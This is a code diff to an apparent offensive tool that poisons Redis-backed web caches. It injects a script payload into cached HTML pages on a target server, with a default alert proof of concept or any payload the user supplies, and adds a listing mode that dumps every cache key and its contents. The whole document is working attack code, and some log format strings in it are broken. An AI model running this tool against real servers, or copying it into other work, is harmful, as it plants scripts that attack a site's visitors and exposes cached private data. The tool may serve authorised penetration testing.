@@ -97,7 +97,7 @@ def handle_html(config, content):
 		elif config.poison_payload:
 			payload = etree.fromstring(config.poison_payload)
 		else:
-			payload = "<script>alert('You're broker injection vulnerable')</script>"
+			payload = etree.fromstring("<script>alert('You are vulnerable to broker injection')</script>")
 
 		insert_point.addnext(payload)
 
@@ -145,6 +145,11 @@ def action_redis_cache_poison(config):
 		# Stop
 		return
 
+	if config.poison is True:
+		log.error("  - Poisoning enabled")
+	else:
+		log.error("  - Listing cache information:")
+
 	# --------------------------------------------------------------------------
 	# Explode caches
 	# --------------------------------------------------------------------------
@@ -159,25 +164,31 @@ def action_redis_cache_poison(config):
 		# --------------------------------------------------------------------------
 		# Make actions over cache
 		# --------------------------------------------------------------------------
+		# Poison is enabled?
+		if config.poison is True:
+			# Set injection
+			try:
+				modified = handle_html(config, content)
+			except ValueError as e:
+				log.error("  - Can't modify cache content: " % e)
+				continue
+			except IOError as e:
+				log.error("  - Can't modify cache content: " % e)
 
-		# Set injection
-		try:
-			modified = handle_html(config, content)
-		except ValueError as e:
-			log.error("  - Can't modify cache content: " % e)
-			continue
-		except IOError as e:
-			log.error("  - Can't modify cache content: " % e)
+			# Injection was successful?
+			if modified is None:
+				log.warning("  - Can't modify content: ensure that content is HTML")
+				continue
 
-		# Injection was successful?
-		if modified is None:
-			log.warning("  - Can't modify content: ensure that content is HTML")
-			continue
+			# Set injection into server
+			con.setex(val, 200, modified)
 
-		# Set injection into server
-		con.setex(val, 200, modified)
+			log.error("  - Poisoned cache key '%s' at server '%s'" % (val, config.target))
+		else:
 
-		log.error("  - Poisoned cache key '%s' at server '%s'" % (val, config.target))
+			# If not poison enabled display cache keys
+			log.error("    -> Key: '%s' - " % val)
+			log.error("    -> Content:\n %s" % content)
 
 	if not cache_keys:
 		log.error("  - No cache keys found in server: Can't poison remote cache.")
